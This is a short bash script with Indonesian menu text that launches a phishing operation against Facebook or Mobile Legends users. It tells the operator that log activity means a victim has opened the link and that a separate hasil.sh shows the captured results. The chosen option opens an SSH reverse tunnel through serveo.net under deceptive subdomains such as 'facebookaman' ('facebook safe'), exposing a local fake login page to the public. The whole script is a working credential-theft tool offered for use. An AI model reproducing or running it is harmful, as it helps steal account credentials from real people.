clear
me='\033[31;1m' #merah
pu='\033[37;1m' #putih

echo $pu" WEB PHISING GAS"
echo $pu" PILIH LINK PHISING YANG SESUAI"
echo $pu" JIKA LOG BERJALAN,BERARTI  KORBAN SUDAH MASUK LINK"
echo $pu" BUKA TAB BARU, JALANKAN"$pu" hasil.sh" $me"untuk melihat hasilnya"
echo $me"___________________________________"
echo $pu" GENERATE LINK\n\n"
echo $me"["$pu"1"$me"]"$pu" FACEBOOK LINK"
echo $me"["$pu"2"$me"]"$pu" MOBILE LEGENDS LINK"
echo $me"___________________________________"
echo $me"╭─["$pu"root@user"$me"]"
read -p"╰─>> " pil
echo $me"___________________________________"

if [ $pil = 1 ]; then
    ssh -R facebookaman.serveo.net:80:localhost:8080 serveo.net
fi

if [ $pil = 2 ]; then
    ssh -R mobilelegends.serveo.net:80:localhost:8080 serveo.net
fi
